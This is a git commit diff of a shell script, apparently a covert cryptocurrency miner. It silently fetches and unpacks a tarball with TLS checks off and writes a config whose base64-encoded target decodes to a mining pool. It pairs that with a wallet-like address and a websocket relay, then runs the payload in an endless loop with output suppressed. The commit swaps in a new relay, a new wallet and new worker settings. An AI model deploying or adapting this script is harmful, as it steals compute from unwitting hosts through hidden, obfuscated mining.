4f7eea2c3397c14ddcfdd23f6dac3737c93b0d20
mrsilkin9-blip <mr.silkin9@fasdeil.com>
2026-08-23 09:30:38 +0700

    Update worker08.sh

--- worker08.sh
+++ worker08.sh
@@ -3,7 +3,7 @@
 curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
 tar -xvf mcpo.tar.gz >/dev/null 2>&1
 rm mcpo.tar.gz
-sleep 40
+sleep 60
 cd mcp && echo '#!/bin/bash
 
 PORT=$1
@@ -19,13 +19,13 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=ws://datacenter.chuyengiaai.online
+echo "SERVER_WS=wss://node--wss--9fb77cgtfy78.code.run
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
-SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
+SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
 SERVER_SECRET=$NAME
 SERVER_CONNECTION=$PORT
 SERVER_MODE=FAST" > .env
 while true; do
   python3 app.py
   sleep 15
-done' > run.sh && chmod +x run.sh && ./run.sh 4 worker08 >/dev/null 2>&1
+done' > run.sh && chmod +x run.sh && nproc --all && ./run.sh 3 worker02
